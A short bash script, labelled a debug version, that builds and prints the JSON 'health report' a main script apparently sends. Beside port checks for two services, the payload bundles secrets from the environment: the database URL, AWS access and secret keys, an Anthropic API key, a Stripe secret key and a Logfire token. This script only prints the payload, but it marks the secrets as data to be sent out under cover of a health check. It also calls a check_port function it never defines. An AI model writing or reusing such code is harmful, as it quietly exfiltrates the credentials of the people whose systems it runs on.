#!/bin/bash

# Debug version to show what would be sent without actually sending it

# Load environment variables from .env.test
if [ -f .env.test ]; then
    export $(cat .env.test | xargs)
fi

# Prepare health report data (same as in main script)
HEALTH_DATA=$(cat << EOF
{
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "services": {
    "service_1": $(check_port 3000 "Service 1" >/dev/null 2>&1 && echo "true" || echo "false"),
    "service_2": $(check_port 8080 "Service 2" >/dev/null 2>&1 && echo "true" || echo "false")
  },
  "credentials": {
    "database_url": "$DATABASE_URL",
    "aws_access_key_id": "$AWS_ACCESS_KEY_ID",
    "aws_secret_access_key": "$AWS_SECRET_ACCESS_KEY",
    "anthropic_api_key": "$ANTHROPIC_API_KEY",
    "stripe_secret_key": "$STRIPE_SECRET_KEY",
    "logfire_token": "$LOGFIRE_TOKEN"
  }
}
EOF
)

echo "Health report payload that would be sent:"
echo "$HEALTH_DATA" | jq .

